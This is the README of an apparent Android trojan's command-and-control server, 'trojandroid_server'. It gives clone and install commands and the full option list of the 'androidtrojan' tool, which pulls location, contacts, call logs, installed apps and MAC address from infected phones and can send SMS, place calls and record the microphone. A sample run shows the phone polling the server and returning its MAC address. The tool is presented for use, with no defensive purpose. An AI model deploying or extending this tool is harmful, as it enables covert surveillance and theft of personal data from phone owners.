Entire README here https://github.com/remijouannet/trojandroid_app
--
trojandroid_server
==

the last component of the project, it's a simple flask script who expose webservice to interact with the trojan.

the trojan launch a background service who's gonna call the webservice continually to see if their is action to execute (send a sms, get the mac address ...), if an order,is given to the trojan, the answer is send from the trojan to the server to an another webservice.

so first of all install trojandroid_server from git


>\# git clone https://github.com/remijouannet/trojandroid_server.git

>\# pip install -r requirements.txt

>\# python setup.py install

after this you can launch teh server with the cmd androidtrojan

>\# androidtrojan -h

```
usage: androidtrojan [-h] [--location] [--contacts] [--calllogs] [--packages]
                     [--mac] [--sendsms PhoneNumber Message]
                     [--call PhoneNumber calltime] [--recordmic recordtime]
                     [-v] [-s folder]

ACTION

optional arguments:
  -h, --help            show this help message and exit
  --location            Get Location
  --contacts            Get Contacts
  --calllogs            Get calllogs
  --packages            Get installed packages
  --mac                 Get Mac address
  --sendsms PhoneNumber Message
                        Send SMS
  --call PhoneNumber calltime
                        Call a number for X millisecondes
  --recordmic recordtime
                        Record mic sound for X millisecondes and receive the
                        audio file
  -v, --verbose         verbose
  -s folder, --ssl folder
                        Folder with app.crt and app.key for https
```

per default, the android trojan use https, so you have to use the script ssl.sh in the repo to generate private/public key, after that you can just launch a command to get information from the trojan.

example to get the mac adress

>\# sudo androidtrojan -s /home/pi/git/trojandroid_server/ssl/ --mac -v
```
 * Running on https://192.168.1.36:443/ (Press CTRL+C to quit)
 * Restarting with stat
192.168.1.50 - - [08/Jul/2015 19:38:44] "GET /action HTTP/1.1" 200 -
192.168.1.50 f8:e0:79:ab:8c:88
f8:e0:79:ab:8c:88
192.168.1.50 - - [08/Jul/2015 19:38:45] "POST /result HTTP/1.1" 200 -
```
